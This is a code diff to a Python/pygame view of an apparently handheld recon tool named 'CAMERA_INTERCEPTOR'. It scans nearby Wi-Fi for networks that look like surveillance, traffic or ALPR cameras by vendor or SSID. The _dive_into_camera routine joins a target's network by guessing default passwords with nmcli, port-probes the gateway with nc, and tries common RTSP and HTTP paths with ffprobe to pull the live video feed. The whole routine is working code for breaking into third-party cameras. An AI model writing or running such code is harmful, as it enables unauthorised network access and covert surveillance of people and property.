@@ -49,7 +49,7 @@ class CameraInterceptorView:
         
         self.ifaces = _list_wlan_ifaces()
         self.mon_iface: str | None = None
-        self.client_iface: str = "wlan0" # Default for connecting
+        self.client_iface: str = "wlan0"
         
         self._stop = False
         self._airodump: Optional[subprocess.Popen] = None
@@ -61,18 +61,23 @@ class CameraInterceptorView:
         self.f_small = pygame.font.Font(None, 20)
         
         if self.ifaces:
-            # Use wlan1 for scanning if available, keep wlan0 for the 'dive'
-            scan_iface = self.ifaces[-1].name
+            # Prioritize wlan0 (Alfa) for scanning, it handles monitor better
+            if any(i.name == "wlan0" for i in self.ifaces):
+                scan_iface = "wlan0"
+            else:
+                scan_iface = self.ifaces[-1].name
+            
             self.client_iface = self.ifaces[0].name
             threading.Thread(target=self._enable_monitor, args=(scan_iface,), daemon=True).start()
 
     def _enable_monitor(self, iface: str):
+        self.status_msg = f"INIT MONITOR ON {iface}..."
         mon = hardware.enable_monitor(iface)
         if mon:
             self.mon_iface = mon
             self._start_scan()
         else:
-            self.status_msg = "MONITOR_INIT_FAIL"
+            self.status_msg = "MONITOR_INIT_FAIL - TRY X TO TOGGLE"
 
     def _start_scan(self):
         LOOT_DIR.mkdir(parents=True, exist_ok=True)
@@ -95,7 +100,6 @@ class CameraInterceptorView:
                 for ap in aps:
                     mac = ap.bssid.upper()
                     vendor = self._get_vendor(mac)
-                    # Broaden detection for tactical cams
                     is_cam = any(x in vendor.upper() for x in ["AXIS", "BOSCH", "HIKVISION", "DAHUA", "SAMSUNG", "PELCO", "HANWHA", "VIVOTEK"]) or \
                              any(x in ap.ssid.upper() for x in ["CAM", "TRAFFIC", "ALPR", "SAFETY", "WATCH", "EYE"])
                     
@@ -120,49 +124,36 @@ class CameraInterceptorView:
         return ouis.get(prefix, "Unknown")
 
     def _dive_into_camera(self, target: CameraTarget):
-        """Attempts to pivot into the camera's private Wi-Fi network."""
         self.phase = PHASE_DIVING
         self.status_msg = f"DIVING INTO {target.ssid or target.bssid}..."
         
         def _worker():
-            # 1. Temporarily stop monitor mode to free up radio
             if self.mon_iface:
                 subprocess.run(["airmon-ng", "stop", self.mon_iface], capture_output=True)
             
-            # 2. Attempt connection via nmcli
-            # For public cams, often 'OPEN' or default 'admin123/password'
             cmd = ["sudo", "nmcli", "dev", "wifi", "connect", target.bssid]
             if "WPA" in target.encryption:
-                # Try common default camera passwords
                 for pw in ["admin123", "password", "12345678"]:
                     res = subprocess.run(cmd + ["password", pw], capture_output=True, text=True)
                     if res.returncode == 0: break
             else:
                 subprocess.run(cmd, capture_output=True)
 
-            # 3. If connected, probe for RTSP
             self.phase = PHASE_PROBING
             self.status_msg = "PROBING FOR VIDEO STREAMS..."
             
-            # Find gateway (the camera)
             try:
                 gw_res = subprocess.check_output("ip route | grep default | awk '{print $3}'", shell=True, text=True).strip()
                 target_ip = gw_res if gw_res else "192.168.1.1"
-                
-                # Check RTSP port
                 ports = [554, 8554, 80, 8000, 8080]
                 found_url = None
                 for p in ports:
-                    # Quick nc probe
                     test = subprocess.run(["nc", "-zv", "-w", "1", target_ip, str(p)], capture_output=True)
                     if test.returncode == 0:
-                        # Success! Try common RTSP paths
                         paths = ["/live", "/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0", "/mjpeg"]
                         for path in paths:
                             url = f"rtsp://{target_ip}:{p}{path}"
                             if p == 80 or p == 8080: url = f"http://{target_ip}:{p}{path}"
-                            
-                            # Test if playable via ffprobe
                             probe = subprocess.run(["ffprobe", "-v", "error", "-timeout", "2000000", url], capture_output=True)
                             if probe.returncode == 0:
                                 found_url = url
@@ -198,10 +189,9 @@ class CameraInterceptorView:
         if self._playing_proc:
             self._playing_proc.terminate()
             self._playing_proc = None
-        # Restore hardware
         hardware.ensure_wifi_managed()
         if self.ifaces:
-            self._enable_monitor(self.ifaces[-1].name)
+            self._enable_monitor(self.mon_iface.replace("mon", "") if self.mon_iface else self.ifaces[-1].name)
 
     def handle(self, ev: ButtonEvent, ctx: App) -> None:
         if not ev.pressed: return
@@ -218,6 +208,18 @@ class CameraInterceptorView:
             self.selected_idx = max(0, self.selected_idx - 1)
         elif ev.button is Button.DOWN:
             self.selected_idx = min(len(self.targets) - 1, self.selected_idx + 1)
+        elif ev.button is Button.X:
+            if self.ifaces:
+                current = self.mon_iface.replace("mon", "") if self.mon_iface else "wlan0"
+                idx = 0
+                try:
+                    for i, iface in enumerate(self.ifaces):
+                        if iface.name == current:
+                            idx = (i + 1) % len(self.ifaces)
+                            break
+                except: pass
+                self._cleanup()
+                threading.Thread(target=self._enable_monitor, args=(self.ifaces[idx].name,), daemon=True).start()
         elif ev.button is Button.A:
             sorted_targets = sorted(self.targets.values(), key=lambda x: x.power, reverse=True)
             if sorted_targets:
@@ -242,7 +244,6 @@ class CameraInterceptorView:
         pygame.draw.line(surf, theme.ACCENT, (0, head_h-1), (theme.SCREEN_W, head_h-1), 2)
         surf.blit(self.f_title.render("RECON :: CAMERA_INTERCEPTOR", True, theme.ACCENT), (theme.PADDING, 8))
         
-        # Target List
         list_rect = pygame.Rect(10, head_h + 10, 480, theme.SCREEN_H - head_h - 60)
         pygame.draw.rect(surf, (10, 10, 15), list_rect)
         pygame.draw.rect(surf, theme.DIVIDER, list_rect, 1)
@@ -253,21 +254,18 @@ class CameraInterceptorView:
             if y > list_rect.bottom - 40: break
             sel = i == self.selected_idx
             if sel: pygame.draw.rect(surf, (30, 30, 50), (15, y, 460, 35), border_radius=4)
-            
             color = theme.ACCENT if t.is_cam else theme.FG
             name = t.ssid if t.ssid else f"[{t.bssid}]"
             surf.blit(self.f_main.render(name[:30], True, color), (25, y + 8))
             surf.blit(self.f_small.render(f"{t.power}dBm", True, theme.FG_DIM), (400, y + 10))
 
-        # Detail Panel
         if sorted_targets:
             self._render_detail(surf, sorted_targets[self.selected_idx], 510, head_h + 20)
 
-        # Footer
         pygame.draw.rect(surf, (10, 10, 15), (0, theme.SCREEN_H - 35, theme.SCREEN_W, 35))
         st_col = theme.ACCENT if self.phase == PHASE_SCAN else theme.WARN
         surf.blit(self.f_small.render(f"STATUS: {self.status_msg}", True, st_col), (10, theme.SCREEN_H - 26))
-        hint = "A: ATTEMPT_DIVE_INTERCEPT  B: BACK" if self.phase == PHASE_SCAN else "A/B: TERMINATE DIVE"
+        hint = "A: DIVE_INTERCEPT  X: TOGGLE_ADAPTER  B: BACK" if self.phase == PHASE_SCAN else "A/B: TERMINATE DIVE"
         h_surf = self.f_small.render(hint, True, theme.FG_DIM)
         surf.blit(h_surf, (theme.SCREEN_W - h_surf.get_width() - 10, theme.SCREEN_H - 26))
 
